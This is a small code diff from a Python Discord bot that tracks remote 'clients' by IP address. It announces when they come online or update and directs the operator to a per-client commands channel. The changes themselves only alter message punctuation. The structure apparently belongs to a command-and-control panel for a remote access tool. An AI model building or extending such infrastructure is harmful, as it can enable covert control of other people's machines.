@@ -149,14 +149,14 @@ async def on_ready():
                     category = nextcord.utils.get(guild.categories, name=str(ip))
                     channel5 = nextcord.utils.get(category.text_channels, name="events")
                     await channel5.send(f"Client updated to version v{tex}")
-                    await channel13.send(f"Client {ip} updated to version v{tex}, use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
+                    await channel13.send(f"Client {ip} updated to version v{tex}! Use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
                     with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as up:
                         up.write("")
                         up.close()
                     with open(os.path.join(target_path, "skibidi-mainmain", "ver.txt"), "w") as up2:
                         up2.write(tex)
                         up2.close()
-            await channel12.send(f"Client {ip} online, use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
+            await channel12.send(f"Client {ip} online! Use commands in: {nextcord.utils.get(category.text_channels, name="commands").mention}")
             category = nextcord.utils.get(guild.categories, name=str(ip))
             if category:
                 embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d)
